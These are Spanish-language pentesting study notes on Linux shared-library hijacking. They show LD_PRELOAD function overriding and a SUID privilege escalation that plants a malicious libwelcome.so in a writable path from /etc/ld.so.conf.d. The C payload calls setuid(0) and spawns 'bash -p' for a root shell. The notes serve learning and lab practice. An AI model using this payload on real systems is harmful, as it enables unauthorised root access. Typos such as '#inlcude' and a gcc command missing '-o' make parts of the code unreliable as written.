----
- Tags: #escalada #teoria #practica 
---

# Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente

### Las **bibliotecas compartidas** son archivos que contiene funciones y recursos utilizados por múltiples programas. Cuando un programa requiere una función de una biblioteca compartida, el sistema operativo busca la biblioteca y enlaza dinámica mente la función requerida durante la ejecución del programa. Sin embargo, si el sistema no encuentra la biblioteca en las rutas predeterminadas, puede buscarla en otros directorios. 

### Un atacante puede aprovechar esta situación creando una **biblioteca compartida maliciosa** con el mismo nombre que la biblioteca legítima y colocándola en un directorio donde el sistema la buscará. Cuando el programa intenta cargar la biblioteca, el sistema cargara la versión malicioso en lugar de la legítima, permitiendo al atacante ejecutar código malicioso con los privilegios del programa víctima. 

# Escalada 

### Para ver las funciones que se usan en un script de una biblioteca de objetos compartida podríamos hacer uso del comando **ldd** o de de un script llamado [uftrace](https://github.com/namhyung/uftrace) para leer las mismas...

```bash 
ldd {binary}

uftrace --force -a {binary}
```

### Una vez que tengamos las funciones que se usan, por ejemplo del script: 

```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char const *argv[]){
    srand(time(NULL));
    printf("%d\n", rand());
    return 0; 
}
```

```bash
uftrace --force -a {binary}
# 1838698392
# DURATION     TID     FUNCTION
#   5.840 us [110824] | time();
#   1.308 us [110824] | srand();
#   0.433 us [110824] | rand();
# 206.138 us [110824] | printf("%d\n") = 11;
```

### Vemos que se nos listan las funciones utilizadas en el script, por lo que ahora intentando realizar un secuestro de la biblioteca de objetos compartidos enlazados dinámicamente podríamos replicar la función *"rand"* que se usa en el script para realizar un código que nos interese. 

### Por lo que para poder realizar esta "suplantación" de función, las firmas deben coincidir (Las firmas son el conjunto de lo que la función **retorna**, como se **llama** y los **argumentos** que recibe)

### Es decir, a la hora de ejecutar el binario, por detrás el enlazador dinámico  por detrás carga las bibliotecas compartidas necesarias para que este programa funcione correctamente, ahora, este enlazador dinámico lo que hace es tomar como prioritario una **variable de entorno** llamada **LD_PRELOAD**, por lo que si esta variable lo igualamos a un binario de una biblioteca compartida que hayamos creado previamente, podríamos manipular el código para que se ejecute las instrucciones que quisiéramos.

```c
int rand(void){
	return 777; 
}
```

### Una vez creado el código malicioso (En este ejemplo alteramos el binario original para que en lugar de retornar un número random retorne siempre *777*) simplemente falta compilarlo como **biblioteca compartida** con el comando **gcc -shared -fPIC {file.c} -o {binary_name}** y exportar la variable de entorno. 

```bash
gcc -shared -fPIC malicious.c -o randomname 

LD_PRELOAD=randomname ./{binary}
```

---

### Otro ejemplo un poco más complejo es el siguiente. 

### Tenemos un binario en la ruta **/usr/bin/welcome** el cual no se puede ejecutar por un error y es SUID. El error que nos tira es *"libwelcome.so: cannot open shared object file: No such file or directory"*. 

### En este caso si jugamos con **ldd /usr/bin/welcome** nos devuelve **libwelcome.so => not found** y en este caso si intentamos explotar este secuestro de la biblioteca con con la variable *LD_PRELOAD* no va a funcionar.

### En estas ocasiones tenemos otras vías, la primera, es ver si tenemos permisos de escritura en la ruta **/etc/ld.so.conf.d** para crear una archivo de configuración para indicar a que ruta tiene que ir el binario para encontrar la biblioteca en cuestión. También podemos ver a que rutas se dirige a la hora de buscar dicho recurso en las configuraciones. 

### En el ejemplo dado, el binario nos arroja error dado que no encuentra la ruta, por lo que vemos que dentro de la ruta **/etc/ld.so.conf.d** existe un archivo de configuración llamado *custom.conf* el cual contiene una ruta inexistente como "*/home/dobliuw/lib*", pero en el home del user dobliuw no existe la carpeta *lib*, por lo que podríamos crear la carpeta y así mismo el script en c malicioso para **convertirlo** en una **biblioteca compartida**. 

```bash
cd /home/dobliuw 

mkdir lib 

cd !$ 

nano malicious.c 
```

#### malicious.c 
```c
#inlcude <stdio.h> 
#include <unistd.h>

int welcome(){
	setuid(0);
	setgid(0);
	system("bash -p");
	return 0;
}
```
#### PD: La función se llama welcome ya que podríamos ponerle un nombre típico como main y al compilar el binario como biblioteca compartida y ejecutar el binario inicial nos arrojaría un warning de que no se encuentra la función "welcome" de la librería, por lo que nos da a entender que la función que se usa es welcome. 

### Ahora solo quedaría convertir dicho script en un binario de **biblioteca compartida** con `gcc -shared -fPIC malicious.c libwelcome.so`. 

### Por lo que ahora al ejecutar el binario inicial (*/usr/bin/welcome*) al contener permisos SUID y habiendo *secuestrado la biblioteca de objetos compartidos enlazados dinámicamente* con un script el cual setea el uid en 0 para asegurarnos ser root nos lanzaría una consola privilegiada como root. 



